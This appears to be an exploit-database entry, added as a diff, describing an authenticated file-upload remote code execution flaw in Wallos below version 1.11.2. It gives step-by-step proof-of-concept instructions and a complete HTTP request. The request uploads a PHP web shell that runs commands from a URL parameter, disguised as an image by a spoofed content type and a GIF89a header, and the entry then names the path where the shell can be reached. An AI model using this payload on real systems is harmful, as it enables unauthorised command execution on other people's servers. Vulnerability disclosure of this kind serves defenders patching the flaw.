@@ -1,0 +1,84 @@
+id: 39409
+date: 03/05/2024
+title: Wallos Shell Upload Vulnerability
+author: bot
+cves: 
+
+# Exploit Title: Wallos - File Upload RCE (Authenticated)
+# Date: 2024-03-04
+# Exploit Author: sml@lacashita.com
+# Vendor Homepage: https://github.com/ellite/Wallos
+# Software Link: https://github.com/ellite/Wallos
+# Version: < 1.11.2
+# Tested on: Debian 12
+
+Wallos allows you to upload an image/logo when you create a new subscription.
+This can be bypassed to upload a malicious .php file.
+
+POC
+---
+
+1) Log into the application.
+2) Go to "New Subscription"
+3) Upload Logo and choose your webshell .php
+4) Make the Request changing Content-Type to image/jpeg and adding "GIF89a", it should be like:
+
+--- SNIP -----------------
+
+POST /endpoints/subscription/add.php HTTP/1.1
+
+Host: 192.168.1.44
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Referer: http://192.168.1.44/
+
+Content-Type: multipart/form-data; boundary=---------------------------29251442139477260933920738324
+
+Origin: http://192.168.1.44
+
+Content-Length: 7220
+
+Connection: close
+
+Cookie: theme=light; language=en; PHPSESSID=6a3e5adc1b74b0f1870bbfceb16cda4b; theme=light
+
+-----------------------------29251442139477260933920738324
+
+Content-Disposition: form-data; name="name"
+
+test
+
+-----------------------------29251442139477260933920738324
+
+Content-Disposition: form-data; name="logo"; filename="revshell.php"
+
+Content-Type: image/jpeg
+
+GIF89a;
+
+<?php
+system($_GET['cmd']);
+?> 
+
+-----------------------------29251442139477260933920738324
+
+Content-Disposition: form-data; name="logo-url"
+
+----- SNIP -----
+
+5) You will get the response that your file was uploaded ok:
+
+{"status":"Success","message":"Subscription updated successfully"}
+
+
+6) Your file will be located in: 
+http://VICTIM_IP/images/uploads/logos/XXXXXX-yourshell.php
+
+#  0day.today [2024-03-06]  #
